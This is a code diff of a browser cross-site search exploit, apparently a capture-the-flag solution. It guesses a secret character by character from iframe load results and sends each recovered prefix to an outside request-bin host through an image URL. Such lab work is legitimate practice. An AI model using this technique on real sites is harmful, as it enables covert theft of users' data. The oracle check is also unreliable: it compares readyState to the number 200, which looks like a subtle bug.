@@ -6,8 +6,7 @@
             const iframe = document.getElementById("iframe");
             iframe.src = url;
             iframe.onload = () => { 
-                var iframeWindow = iframeElement.contentWindow;
-                if (iframeWindow && iframeWindow.document && iframeWindow.document.readyState == 200)
+                if (iframe.contentWindow.readyState == 200)
                     return resolve();
                 else
                     return reject();
@@ -31,7 +30,7 @@
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://mdfooiz.request.dreamhack.games/${secret}`;
+                    img.src = `https://adnvlei.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
